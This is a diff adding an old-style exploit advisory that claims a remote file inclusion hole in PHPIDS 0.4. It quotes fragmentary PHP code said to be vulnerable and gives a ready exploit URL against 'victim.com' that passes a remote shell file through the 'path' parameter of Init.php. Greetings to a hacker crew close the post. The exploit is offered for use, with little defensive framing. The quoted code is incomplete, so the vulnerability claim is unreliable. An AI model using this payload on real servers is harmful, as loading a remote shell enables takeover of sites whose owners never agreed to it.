@@ -1,0 +1,41 @@
+###########################################################
+###									#
+### 		PHPIDS 0.4 - Remote File Inclusion Vulnerability			#
+###									#
+###########################################################
+###	
+###	* @package	  PHPIDS
+###	* @Version 	  0.4
+###	* @license	  http://www.gnu.org/licenses/lgpl.html LGP
+###	* @link		  http://php-ids.org/	
+###
+###########################################################
+###
+###	Type :	Remote File Inclusion Vulnerability
+###	Author:	eidelweiss
+###	Date  :	2010-02-08
+###	Location:	Indonesia ( http://yogyacarderlink.web.id )
+###	Contact:	g1xsystem [at] windowslive [dot] com
+###
+###########################################################
+###
+###	Vuln:	require_once 'IDS/Init.php'
+###
+###		if (version_compare(phpversion(), '5.1.6', '>=')) {
+###			set_include_path (
+###				get_include_path()
+###				. PATH_SEPARATOR
+###				. BX_DIRECTORY_PATH_PLUGINS . 'phpids/'
+###
+###		include_once 'IDS/Monitor.php';
+###		include_once 'IDS/Filter/Storage.php';
+###		if ($configPath) {
+###			$this->setConfigPath($configPath);
+###			$this->config = parse_ini_file($this->configPath, true);
+###	=========================================================
+###	Exploit: http://victim.com/[PHPIDS_path]/IDS/Init.php?path=[Shell.txt?]
+###########################################################
+###									#
+###	Greetz : AL-MARHUM - YOGYACARDERLINK TEAM - (D)eal(C)yber		#
+###									#
+###########################################################
